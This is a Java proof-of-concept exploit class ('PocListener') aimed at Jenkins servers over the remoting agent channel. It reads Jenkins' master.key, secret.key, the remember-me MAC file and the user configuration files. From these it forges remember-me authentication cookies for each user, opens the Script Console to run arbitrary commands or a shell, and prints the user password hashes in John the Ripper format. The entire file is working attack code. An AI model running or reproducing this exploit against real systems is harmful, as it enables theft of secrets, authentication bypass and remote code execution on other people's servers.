package poc;

import hudson.remoting.Engine;
import hudson.remoting.EngineListener;
import java.io.File;
import java.io.IOException;
import java.net.URL;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.TreeMap;
import java.nio.charset.StandardCharsets;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.net.HttpURLConnection;
import java.net.URL;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;


public final class PocListener implements EngineListener {

    private static final String MASTER_KEY = "/secrets/master.key";
    private static final String SECRET_KEY = "/secret.key";
    private static final String REMEMBER_MAC = "/secrets/org.springframework.security.web.authentication.rememberme.TokenBasedRememberMeServices.mac";
    private static final String USERS_XML = "/users/users.xml";

    private static final Logger LOGGER = Logger.getLogger(PocListener.class.getName());

    private ClassLoader ccl = null;
    private RemoteFileReader reader = null;
    private String jenkinsBasePath = null;
    private String jenkinsServer = null;
    private String cmd = null;

    public PocListener(String jenkinsServer) {
        this.jenkinsServer = jenkinsServer;
        this.cmd = null;
    }

    public PocListener(String jenkinsServer, String cmd) {
        this.jenkinsServer = jenkinsServer;
        this.cmd = cmd;
    }

    @Override
    public void status(String msg, Throwable t) {
        //LOGGER.log(Level.INFO, msg, t);
    }


    @Override
    public void status(String msg) {
        status(msg, null);
        if (msg.startsWith("Connected")) {
            exploit();
       }
    }

    public void exploit() {
        if (this.ccl == null) this.ccl = this.getRemoteClassLoader();

        this.reader = new RemoteFileReader(this.ccl);
        this.jenkinsBasePath = findJenkinsBasePath();

        System.out.println("[*] Reading users...");
        Map<Long, UserInfo> orderedUsers = readUsers();

        String masterKeyPath    = Paths.get(this.jenkinsBasePath, MASTER_KEY).toString();
        String secretKeyPath    = Paths.get(this.jenkinsBasePath, SECRET_KEY).toString();
        String rememberMacPath  = Paths.get(this.jenkinsBasePath, REMEMBER_MAC).toString();

        System.out.println("[*] Reading master.key");
        String master_key   = this.reader.readAsString(masterKeyPath);
        printChunked(master_key, 64);
        System.out.println("[*] Reading secret.key");
        String secret       = this.reader.readAsString(secretKeyPath);
        System.out.println("    " + secret);
        System.out.println("[*] Reading ...rememberme.TokenBasedRememberMeServices.mac");
        byte[] mac          = this.reader.readAsBytes(rememberMacPath);

        if (mac.length == 0) {
            System.out.println("    Could not find MAC file, forcing its creation by trigerring a remember-me cookie checking ...");

            forceMacFileCreation(orderedUsers);

            System.out.println("[*] Reading ...rememberme.TokenBasedRememberMeServices.mac");
            mac               = this.reader.readAsBytes(rememberMacPath);
        }

        System.out.println("    " + bytesToHex(mac));


        System.out.println("[*] Instantiating the CookieForger");
        CookieForger forger = new CookieForger(this.jenkinsServer, master_key, secret, mac);

        for (Map.Entry<Long, UserInfo> entry : orderedUsers.entrySet()) {
            UserInfo userinfo = entry.getValue();

            System.out.println("[*] Forging remember-me cookie for user '" + userinfo.name + "'");
            String cookie = forger.cookieFor(userinfo);
                            System.out.println("    User:      " + userinfo.name);
            System.out.println("    Timestamp: " + userinfo.timestamp);
            System.out.println("    Seed:      " + userinfo.seed);
            System.out.println("    Hash:      " + userinfo.hash);
            System.out.println("    Cookie:    remember-me=" + cookie);
            System.out.println("[*] Accessing Jenkins Script Console");
            ScriptConsole console = new ScriptConsole(this.jenkinsServer, cookie);
            boolean success;

            if (this.cmd != null)
                success = console.runCommand(this.cmd);
            else
                success = console.shell();

            if (success) break;
        }
        usersToJTR(orderedUsers);
        if (this.cmd == null)
            System.exit(0);
    }

    public void forceMacFileCreation(Map<Long, UserInfo> orderedUsers) {
        Map.Entry<Long, UserInfo> firstEntry = orderedUsers.entrySet().iterator().next();
        UserInfo userinfo = firstEntry.getValue();

        FakeCookieForger forger = new FakeCookieForger(this.jenkinsServer);
        String cookie = forger.cookieFor(userinfo);

        try {
            URL url = new URL(this.jenkinsServer);
            HttpURLConnection con = (HttpURLConnection) url.openConnection();
            con.setRequestMethod("GET");
            con.setRequestProperty("Cookie", "remember-me=" + cookie);

            int responseCode = con.getResponseCode();
            //System.out.println("Response Code: " + responseCode);

            con.disconnect();
        } catch (Exception e) {
             e.printStackTrace();
        }
    }

    public void usersToJTR(Map<Long, UserInfo> orderedUsers) {
        System.out.println("[*] Users to John The Ripper");
        for (Map.Entry<Long, UserInfo> entry : orderedUsers.entrySet()) {
            UserInfo userinfo = entry.getValue();
            String line = userinfo.toJTR();
            System.out.println("    " + line);
        }
    }


    public void printChunked(String s, int chunkSize) {
        int length = s.length();
        int numChunks = (length + chunkSize - 1) / chunkSize;
        // Loop through and print each chunk
        for (int i = 0; i < numChunks; i++) {
            int start = i * chunkSize;
            int end = Math.min(start + chunkSize, length);
            String chunk = s.substring(start, end);
            System.out.println("    " + chunk);
        }
    }

    public String findJenkinsBasePath() {
        System.out.print("[*] Trying to find Jenkins' base path");
        String[] locations = {
            "file:/var/lib/jenkins",
            "file:/var/jenkins_home"
        };

        for (String loc : locations) {
            String secretKeyPath    = Paths.get(loc, SECRET_KEY).toString();
            //System.out.println("Trying " + secretKeyPath + " ...");
            if (this.reader.readAsString(secretKeyPath).length() > 0) {
                System.out.println(" - FOUND");
                return loc;
            }
        }
        System.out.println(" - NOT FOUND");
        return null;
    }

    public Map<Long, UserInfo> readUsers() {
        UserParser userParser = new UserParser();
        String usersXMLPath = Paths.get(this.jenkinsBasePath, USERS_XML).toString();
        String usersXMLContent = this.reader.readAsString(usersXMLPath);

        Map<String, String> users = userParser.parseUsersUsers(usersXMLContent);
        Map<Long, UserInfo> orderedUsers = new TreeMap<>();
        for (Map.Entry<String, String> entry : users.entrySet()) {
            String user = entry.getKey();
            String path = entry.getValue();
            String userConfigXMLPath = Paths.get(this.jenkinsBasePath, "users", path, "config.xml").toString();
            String userConfigXMLContent = this.reader.readAsString(userConfigXMLPath);
            UserInfo userinfo = userParser.parse(userConfigXMLContent);
            orderedUsers.put(userinfo.timestamp, userinfo);
        }
        return orderedUsers;
    }


    public ClassLoader getRemoteClassLoader() {
        boolean found = false;
        ClassLoader temp = null;
        while (!found) {
            for (Thread thread : Thread.getAllStackTraces().keySet()) {
                temp = thread.getContextClassLoader();
                if (temp == null) continue;
                String className = temp.getClass().getName();
                if (className.equals("hudson.remoting.RemoteClassLoader")) {
                    found = true;
                    break;
                }
            }
            try {
                Thread.sleep(1000);
            } catch(Exception e) {}
        }
        return temp;
    }


    @Override
    public void error(Throwable t) {
        LOGGER.log(Level.SEVERE, t.getMessage(), t);
        System.exit(-1);
    }

    @Override
    public void onDisconnect() {}

    @Override
    public void onReconnect() {}


    private static String bytesToHex(byte[] bytes) {
        StringBuilder hexString = new StringBuilder();
        for (byte b : bytes) {
            String hex = Integer.toHexString(0xff & b);
            if (hex.length() == 1) {
                hexString.append('0');
            }
            hexString.append(hex);
        }
        return hexString.toString();
    }
}

